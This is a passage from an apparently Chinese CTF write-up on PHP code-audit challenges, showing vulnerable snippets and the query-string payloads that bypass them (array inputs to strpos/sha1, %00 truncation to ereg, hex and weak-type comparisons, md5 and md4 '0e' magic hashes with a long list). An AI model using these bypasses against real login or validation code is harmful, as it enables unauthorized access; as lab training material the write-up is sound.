class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>ereg</td><td>函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回true，否则返回false</td></tr><tr><td>strpos</td><td>函数查找字符串在另一字符串中第一次出现的位置。</td></tr></tbody></table><p>第4行代码，ereg函数会对传入的password从<code>a-z,A-Z,0-9</code> 进行匹配，将你的密码限制在这三种字符中。</p><p><strong>方法一</strong>：<br><code>strpos()</code>需要匹配到<code>--</code>才能输出flag，所以我们需要绕过<code>strpos()</code>函数。<code>strpos()</code>如果传入数组，会返回NULL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185451492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>方法二</strong>：</p><p>搜索字母的字符是大小写敏感的, 我们可以用%00来截断，在%00之后的数值函数无法识别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>--<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031185650537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="6-弱类型整数大小比较绕过"><a href="#6-弱类型整数大小比较绕过" class="headerlink" title="6. 弱类型整数大小比较绕过"></a>6. 弱类型整数大小比较绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>is_numeric(<span class="hljs-variable">$temp</span>)?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no numeric&quot;</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$temp</span>&gt;<span class="hljs-number">1336</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>is_numeric()</td><td>判断变量是否为数字或数字字符串</td></tr></tbody></table><p>传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，传参<code>password=2000a</code>既不是一个数字又大于1336,返回NULL，可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">2000</span>a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031192339220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="7-sha-函数比较绕过"><a href="#7-sha-函数比较绕过" class="headerlink" title="7. sha()函数比较绕过"></a>7. sha()函数比较绕过</h2><p><a href="http://123.206.87.240:9009/7.php">http://123.206.87.240:9009/7.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;  &quot;</span>;<br>var_dump(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>var_dump(sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>; <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === sha1(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>); <span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid password.&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Login first!&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>sha1()函数无法处理数组类型，通过构造数组，将报错并返回false，使条件成立，这样就绕过了sha1()函数，获得flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201031215444337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="8-md5加密相等绕过"><a href="#8-md5加密相等绕过" class="headerlink" title="8. md5加密相等绕过"></a>8. md5加密相等绕过</h2><p><a href="http://123.206.87.240:9009/13.php">http://123.206.87.240:9009/13.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$md51 = md5(&#x27;QNKCDZO&#x27;);<br>$a = @$_GET[<span class="hljs-string">&#x27;a&#x27;</span>];<br>$md52 = @md5($a);<br><span class="hljs-keyword">if</span>(isset($a)) &#123;<br>if ($a != &#x27;QNKCDZO&#x27; &amp;&amp; $md51 == $md52) &#123;<br>echo <span class="hljs-string">&quot;flag&#123;*&#125;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo <span class="hljs-string">&quot;false!!!&quot;</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo <span class="hljs-string">&quot;please input a&quot;</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>字符串QNKCDZO被md5加密后之后是前两位为<code>0e</code>，然后我们找一个字符串的md5之后的结果也为e0xxx的就可以绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?a=s878926199a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103191138163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>原理：</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，</p><p>所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><p>以下字符串，md5哈希值都是0e开头的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c">QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1184209335a<br><span class="hljs-number">0e072485820392773389523109082030</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s532378020a<br><span class="hljs-number">0e220463095855511507588041205815</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><br>s1502113478a<br><span class="hljs-number">0e861580163291561247404381396064</span><br><br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br><br>s1836677006a<br><span class="hljs-number">0e481036490867661113260034900752</span><br><br>s1665632922a<br><span class="hljs-number">0e731198061491163073197128363787</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br></code></pre></td></tr></table></figure><h2 id="9-十六进制与数字比较"><a href="#9-十六进制与数字比较" class="headerlink" title="9. 十六进制与数字比较"></a>9. 十六进制与数字比较</h2><p><a href="http://123.206.87.240:9009/20.php">http://123.206.87.240:9009/20.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-function">function <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span> </span>&#123;<br>$flag = &#x27;flag&#123;test&#125;&#x27;;<br>$one = ord(<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br>$nine = ord(<span class="hljs-string">&#x27;9&#x27;</span>);<br><span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span><br>$number = &#x27;3735929054&#x27;;<br><span class="hljs-comment">// Check all the input characters!</span><br><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; <span class="hljs-built_in">strlen</span>($number); $i++) &#123;<br><span class="hljs-comment">// Disallow all the digits!</span><br>$digit = ord($temp &#123;$i&#125;);<br><span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123;<br><span class="hljs-comment">// Aha, digit not allowed!</span><br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;flase&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>($number == $temp)<br><span class="hljs-keyword">return</span> $flag;<br>&#125;<br>$temp = $_GET[&#x27;password&#x27;];<br><span class="hljs-function">echo <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>参数不能有1-9的数字，同时要求该参数值为3735929054，所以把值转换成十六进制传参。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Payload: ?password=<span class="hljs-number">0xdeadc0de</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102122943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="10-ereg正则-00截断"><a href="#10-ereg正则-00截断" class="headerlink" title="10. ereg正则%00截断"></a>10. ereg正则%00截断</h2><p><a href="http://123.206.87.240:9009/5.php">http://123.206.87.240:9009/5.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$flag = <span class="hljs-string">&quot;xxx&quot;</span>;<br>if (isset ($_GET[&#x27;password&#x27;])) &#123;<br>if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123;<br>echo &#x27;You password must be alphanumeric&#x27;;<br>&#125; else if (strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123;<br>if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos — 查找字符串首次出现的位置 &#123;<br>die(&#x27;Flag: &#x27; . $flag);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo(&#x27;have not been found&#x27;);<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>echo &#x27;Invalid password&#x27;;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>传入的值必须是数字或大小写字符，长度小于8且大于9999999,且匹配到”<em>-</em>“才能输出flag。</p><p>可以使用<code>%00</code>来截断，当ereg函数读到 <code>%00</code>的时候，就截止了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?password=<span class="hljs-number">1e8</span>%<span class="hljs-number">00</span>*-*<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102124459121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="11-strpos数组绕过"><a href="#11-strpos数组绕过" class="headerlink" title="11. strpos数组绕过"></a>11. strpos数组绕过</h2><p><a href="http://123.206.87.240:9009/15.php">http://123.206.87.240:9009/15.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>$flag = <span class="hljs-string">&quot;flag&quot;</span>;<br>if (isset ($_GET[&#x27;ctf&#x27;])) &#123;<br>if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;ctf&#x27;]) === FALSE)<br>     echo &#x27;必须输入数字才行&#x27;; <br>else if (strpos ($_GET[&#x27;ctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE)<br>     die(&#x27;Flag: &#x27;.$flag); <br><span class="hljs-keyword">else</span><br>     echo &#x27;骚年，继续努力吧啊~&#x27;;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>要求传入的参数为数字并且包含字符串“#biubiubiu”，有点难搞。</p><p>可以通过数组绕过<code>strpos</code>与<code>ereg</code>函数，遇到数组返回NULL，数值和类型相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Payload: ?ctf[]=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201102125444628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="12-数字验证正则绕过"><a href="#12-数字验证正则绕过" class="headerlink" title="12. 数字验证正则绕过"></a>12. 数字验证正则绕过</h2><p><a href="http://123.206.87.240:9009/21.php">http://123.206.87.240:9009/21.php</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php<br>error_reporting(<span class="hljs-number">0</span>);<br>$flag = &#x27;flag&#123;test&#125;&#x27;;<br>if (&quot;POST&quot; == $_SERVER[&#x27;REQUEST_METHOD&#x27;]) &#123;<br>$password = $_POST[&#x27;password&#x27;];<br>if (0 &gt;= preg_match(&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;, $password)) //preg_match — 执行一个正则表达式匹配 &#123;<br>echo &#x27;flag&#x27;;<br><span class="hljs-built_in">exit</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (TRUE) &#123;<br>$reg = &#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;;<br><span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))<br><span class="hljs-keyword">break</span>;<br>$c = <span class="hljs-number">0</span>;<br>$ps = array(&#x27;punct&#x27;, &#x27;digit&#x27;, &#x27;upper&#x27;, &#x27;lower&#x27;);<br><span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span><br>foreach ($ps as $pt) &#123;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:$pt:]]+/&quot;</span>, $password))<br>$c += <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == $password) <br>              echo $flag; <br>        <span class="hljs-keyword">else</span> <br>              echo &#x27;Wrong password&#x27;;<br><span class="hljs-built_in">exit</span>;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>代码中涉及到的一些正则函数<br>| 正则匹配函数   | 描述                                                         | 区别                       |<br>| ————– | ———————————————————— | ————————– |<br>| preg_match     | 执行一个正则表达式匹配，匹配到则返回1，匹配不到则返回0       | 第一次匹配成功后就停止匹配 |<br>| preg_match_all | 执行一个全局正则表达式匹配，返回成功模式匹配的次数，并将匹配结果存储到一个数组中 | 匹配到字符串结束为止       |</p><p>下面还有几个正则匹配的字符：<br>| 正则匹配字符  | 描述 |ASCII|<br>|–|–|–|<br>| [:graph:] |除空格，TAB外的所有字符 |[\x21-\x7E]<br>|[a-zA-Z0-9]|大小写字母和数字 |[a-zA-Z0-9]<br>|[:alpha:]|大小写字母|    [a-zA-Z]|<br>| [:punct:] | 任何标点符号|[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{} ~]|<br>| [:digit:] |任何数字 |[0-9]<br>| [:upper:] |任何大写字母 |[A-Z]<br>| [:lower:] |任何小写字母 |[a-z]</p><p>代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">请求方法必须为POST<br><span class="hljs-number">1</span>、正则匹配，[:graph:]为任意字符，要求password长度超过<span class="hljs-number">12</span><br><span class="hljs-number">2</span>、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过<span class="hljs-number">6</span>次<br><span class="hljs-number">3</span>、标点符号，数字，大写字母，小写字母，包含<span class="hljs-number">3</span>种以上绕过<br><span class="hljs-number">4</span>、弱类型比较，42abc,强制转换为数字<br></code></pre></td></tr></table></figure><p>构造Payload，居然提示<code>Wrong password</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: password=42BugKuctf.a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201103190435176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>仔细看了一下代码，变量原来是flag，改一下Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload: flag=42BugKuctf.a<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020110318591559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这道题有点奇怪，随便post一个值也能得到flag，小小脑袋有大大疑问。<br><img src="https://img-blog.csdnimg.cn/20201103185441793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="13-md4绕过"><a href="#13-md4绕过" class="headerlink" title="13.md4绕过"></a>13.md4绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>] != hash(<span class="hljs-string">&quot;md4&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>])) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Theshy is locked&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码中get进来的参数a，使<code>a=md4(a)</code>才行。</p><p>百度一下md4绕过，发现可以通过科学计算法比较绕过。找一个值是一个科学计算法0e开头的，其md4加密后也为0e开头，弱类型比较绕过。</p><table><thead><tr><th>a</th><th>md4(a)</th></tr></thead><tbody><tr><td>0e251288019</td><td>0e874956163641961271069404332409</td></tr><tr><td>0e001233333333333334557778889</td><td>0e434041524824285414215559233446</td></tr><tr><td>Payload为：</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?a=<span class="hljs-number">0e251288019</span><br>或<br>?a=<span class="hljs-number">0e001233333333333334557778889</span><br></code></pre></td></tr></table></figure><h2 id="14-json绕过"><a href="#14-json绕过" class="headerlink" title="14.json绕过"></a>14.json绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$message</span> = json_decode(<span 